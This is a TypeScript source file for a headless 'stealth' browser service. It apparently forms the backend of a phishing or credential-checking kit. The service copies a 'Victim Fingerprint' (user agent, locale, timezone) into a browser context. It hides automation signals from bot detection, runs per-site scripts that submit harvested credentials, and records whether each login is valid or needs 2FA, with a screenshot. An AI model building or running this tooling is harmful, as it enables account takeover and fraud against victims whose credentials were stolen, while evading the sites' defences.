import { chromium, Browser, BrowserContext, Page } from 'playwright-extra';
import stealthPlugin from 'puppeteer-extra-plugin-stealth';
import { getFlowScript } from '../automation';
import { AutomationRequest, AutomationResult } from '../types';

// Apply Stealth
chromium.use(stealthPlugin());

export class AutomationService {
    private static browser: Browser | null = null;
    private static connectionTime = 0;
    private static queue: AutomationRequest[] = [];
    private static activeWorkers = 0;
    private static MAX_WORKERS = 2; // Strict limit to save RAM

    static async init() {

        if (!this.browser) {
            console.log('[Automation] Launching Stealth Browser...');
            try {
                this.browser = await chromium.launch({
                    headless: true, // Visible for debugging if false
                    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-blink-features=AutomationControlled'] // Docker friendly
                });
                this.connectionTime = Date.now();
                console.log('[Automation] Stealth Browser Ready');
            } catch (e) {
                console.error('[Automation] Failed to launch browser:', e);
            }
        }
    }

    static async shutdown() {
        if (this.browser) await this.browser.close();
    }

    static async verifySession(request: AutomationRequest): Promise<AutomationResult> {
        return this.runWorker(request);
    }

    private static async runWorker(req: AutomationRequest): Promise<AutomationResult> {
        if (!this.browser) await this.init();
        if (!this.browser) return { status: 'error', details: 'Browser not available' };

        // Recycle browser every hour to prevent RAM leaks
        if (Date.now() - this.connectionTime > 3600000) {
            await this.browser.close();
            this.browser = null;
            await this.init();
        }

        console.log(`[Automation] Verifying ${req.flowId} for user ${req.userId}`);

        let context: BrowserContext | null = null;
        try {
            // 1. Create Context with Victim Fingerprint
            // Stealth plugin handles most navigator.webdriver hiding
            context = await this.browser!.newContext({
                userAgent: req.fingerprint?.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                viewport: req.fingerprint?.viewport || { width: 1280, height: 720 },
                locale: req.fingerprint?.locale || 'en-US',
                timezoneId: req.fingerprint?.timezone || 'America/New_York',
                deviceScaleFactor: 1,
                hasTouch: false,
                isMobile: false,
                permissions: ['geolocation'],
            });

            // 2. Get Page
            const page = await context.newPage();

            // Randomize cursor movement function (Humanize)
            await page.addInitScript(() => {
                // @ts-ignore
                window.navigator.chrome = { runtime: {} };
            });

            // 3. Get specific script
            const script = getFlowScript(req.flowId);
            if (!script) {
                return { status: 'error', details: 'No script for this flow' };
            }

            // 4. Run Script
            // Timeout safety
            const result = await Promise.race([
                script.verify(page, req.credentials),
                new Promise<AutomationResult>((_, reject) => setTimeout(() => reject(new Error('Timeout')), 90000)) // 90s Timeout
            ]);

            // Capture screenshot on important statuses
            if (result.status === 'valid' || result.status === '2fa_required' || result.status === 'invalid') {
                const buffer = await page.screenshot({ quality: 50, type: 'jpeg' });
                result.screenshot = buffer.toString('base64');
            }

            return result;

        } catch (e: any) {
            console.error(`[Automation] Error verifying ${req.flowId}:`, e);
            return { status: 'error', details: e.message };
        } finally {
            if (context) await context.close();
        }
    }
}
